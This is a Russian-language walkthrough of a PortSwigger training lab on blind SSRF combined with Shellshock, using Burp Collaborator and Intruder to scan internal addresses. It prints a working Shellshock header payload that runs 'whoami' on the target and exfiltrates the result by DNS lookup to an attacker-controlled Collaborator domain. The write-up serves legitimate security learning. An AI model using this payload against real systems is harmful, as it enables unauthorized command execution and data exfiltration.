# Blind SSRF with Shellshock exploitation

## Theory

<h3>Как найти и использовать слепые SSRF-уязвимости</h3>

Самый надежный способ обнаружения слепых SSRF-уязвимостей — использование внеполосных (OAST) методов. Это включает в себя попытку инициировать HTTP-запрос к внешней системе, которую вы контролируете, и отслеживание сетевых взаимодействий с этой системой.

Самый простой и эффективный способ использовать внеполосные методы — использовать Burp Collaborator. Вы можете использовать клиент Burp Collaborator для создания уникальных доменных имен, отправки их в виде полезной нагрузки в приложение и отслеживания любого взаимодействия с этими доменами. Если наблюдается входящий HTTP-запрос, исходящий от приложения, то оно уязвимо для SSRF.

Обычно при тестировании на уязвимости SSRF наблюдается поиск DNS для предоставленного домена Collaborator, но не последующий HTTP-запрос. Обычно это происходит из-за того, что приложение пыталось выполнить HTTP-запрос к домену, что вызвало первоначальный поиск DNS, но фактический HTTP-запрос был заблокирован фильтрацией на уровне сети. Инфраструктура довольно часто разрешает исходящий трафик DNS, поскольку он необходим для очень многих целей, но блокирует HTTP-соединения с неожиданными пунктами назначения.

Простое выявление слепой SSRF-уязвимости, которая может инициировать внеполосные HTTP-запросы, само по себе не дает возможности для эксплуатации. Поскольку вы не можете просмотреть ответ от внутреннего запроса, это поведение нельзя использовать для изучения содержимого в системах, к которым может получить доступ сервер приложений. Однако его все же можно использовать для поиска других уязвимостей на самом сервере или в других внутренних системах. Вы можете вслепую сканировать внутреннее пространство IP-адресов, отправляя полезные данные, предназначенные для обнаружения известных уязвимостей. Если эти полезные нагрузки также используют слепые внеполосные методы, вы можете обнаружить критическую уязвимость на неисправленном внутреннем сервере.

Еще один способ использования слепых SSRF-уязвимостей — побудить приложение подключиться к системе, находящейся под контролем злоумышленника, и вернуть вредоносные ответы HTTP-клиенту, который устанавливает соединение. Если вы сможете использовать серьезную уязвимость на стороне клиента в реализации HTTP сервера, вы сможете добиться удаленного выполнения кода в инфраструктуре приложения.

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/1.png)

В меню Target найдем нашу страницу и добавим ее в scope(Add to scope).

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/2.png)

Попереходим по некоторым страницам сайта, которые предположительно могут содержать уязвимости. Делать это мы будем с включенным Collaborator Everywhere, чтобы автоматически проверять страницы на наличение уязвимости внеполосных методов.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/3.png)

Мы обнаружили два уязвимых заголовка User-Agent и Referer. Перейдем в меню Site map и найдем наш запрос. Отправим его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/4.png)

Запустим Burp Collaborator Client.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/5.png)

Мы будем использовать экплоит shellshock, чтобы получать данные с машины. Мы изменим заголовки User-Agent и Referer, чтобы машина обрщалась к локальной сети и, чтобы мы могли вытащить нужные нам данные. Код экплоита выглядит следующим образом:
```
() { :; }; /usr/bin/nslookup $(whoami).bbqxuerxip7zvwx06wwdmfihc8iz6o.burpcollaborator.net
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/6.png)

Так как мы точно не знаем нужный нам адрес, отправим запрос в Intruder. Заключим X в специальные символы и начнем перебор от 1 до 255.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/7.png)

Дожидаемся окончания атаки и переходим в Burp Collaborator Client. Мы можем обнаружить, что у нас удалось вытащить имя пользователя из атакуемой машины.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/8.png)

Подтверждаем ответ и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(SSRF)_Server-side_request_forgery/Blind_SSRF_with_Shellshock_exploitation/assets/9.png)
